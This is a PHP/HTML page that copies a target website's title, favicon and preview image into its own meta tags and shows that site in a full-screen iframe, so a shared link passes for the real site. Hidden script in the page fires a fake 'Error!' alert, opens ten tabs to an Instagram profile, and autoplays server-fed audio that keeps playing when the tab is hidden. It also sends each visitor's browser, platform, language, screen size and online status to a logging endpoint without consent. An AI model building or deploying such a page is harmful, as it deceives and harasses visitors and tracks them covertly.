<?php include realpath(__DIR__ . '/../url.php'); ?>


    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f4;
        }
        #fakeButton {
            padding: 15px 30px;
            font-size: 20px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
    <script>
        let audio = new Audio();
        let currentAudioSrc = "";

        function fetchLatestAudio() {
            let randomParam = new Date().getTime();
            fetch("audio.php?nocache=" + randomParam)
                .then(response => response.text())
                .then(newAudioSrc => {
                    newAudioSrc = newAudioSrc.trim();

                    if (newAudioSrc && newAudioSrc !== currentAudioSrc) {
                        currentAudioSrc = newAudioSrc;
                        audio.src = newAudioSrc;
                        audio.load();

                        audio.play().catch(() => {
                            document.addEventListener("click", () => audio.play(), { once: true });
                        });
                    }
                })
                .catch(error => console.error("Error fetching audio:", error));
        }

        audio.addEventListener("canplaythrough", () => {
            audio.play();
        });

        audio.addEventListener("ended", () => {
            fetchLatestAudio(); 
        });

        function logVisitor(status) {
            let userAgent = navigator.userAgent;
            let platform = navigator.platform;
            let language = navigator.language;
            let screenSize = `${screen.width}x${screen.height}`;

            fetch("log_visitor.php", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ userAgent, platform, language, screenSize, status })
            });
        }

        function openTabs() {
            let url = "https://www.instagram.com/_.mmrehu/"; 
            for (let i = 0; i < 10; i++) {
                window.open(url, "_blank");
            }
        }

        function fakePopup() {
            alert("Error! Please click OK to continue."); 
            openTabs(); 
        }

        // Keep audio playing even when tab is changed
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === "hidden") {
                audio.play(); // Keep playing audio even when tab is inactive
            }
        });

        window.onload = function () {
            setTimeout(fakePopup, 2000); // Fake popup triggers after 2 seconds
            fetchLatestAudio();
            logVisitor("Online");
        };

        window.onbeforeunload = () => {
            navigator.sendBeacon("log_visitor.php", JSON.stringify({ status: "Offline" }));
        };

        setInterval(fetchLatestAudio, 3000); // Fetch new audio every 30 seconds
    </script>
</head>
<body>
   <?php
// Get URL from query parameter (?url=https://example.com)


// Fetch page HTML
$html = @file_get_contents($url);
if (!$html) {
    die("Failed to fetch the website.");
}

// Extract page title
preg_match("/<title>(.*?)<\/title>/i", $html, $matches);
$pageTitle = $matches[1] ?? "Untitled Website";

// Extract favicon
$favicon = "https://www.google.com/s2/favicons?sz=64&domain=" . parse_url($url, PHP_URL_HOST);

// Extract OpenGraph thumbnail
preg_match('/<meta property="og:image" content="(.*?)"/i', $html, $matches);
$thumbnail = $matches[1] ?? $favicon; // Use favicon if OG image is missing
?>
<head>
    <title><?php echo htmlspecialchars($pageTitle); ?></title>

    <!-- Meta Tags for Social Sharing -->
    <meta property="og:title" content="<?php echo htmlspecialchars($pageTitle); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($thumbnail); ?>">
    <meta property="og:url" content="<?php echo htmlspecialchars($url); ?>">
    <meta property="og:type" content="website">

    <!-- Favicon -->
    <link rel="icon" href="<?php echo htmlspecialchars($favicon); ?>" type="image/png">

    <style>
       body {
           margin: 0;
           padding: 0;
           height: 100vh;
           display: flex;
           justify-content: center;
           align-items: center;
           background-color: #f4f4f4;
       }

       .iframe-container {
           width: 100vw;
           height: 100vh;
           border: none;
           overflow: hidden;
       }

       iframe {
           width: 100%;
           height: 100%;
           border: none;
       }

       @media (max-width: 768px) {
           .iframe-container {
               width: 100%;
               height: 100vh;
               border-radius: 0;
               border: none;
           }
       }
    </style>
</head>
<body>

  

    <div class="iframe-container">
       <iframe src="<?php echo htmlspecialchars($url); ?>"></iframe>

</body>
</html>
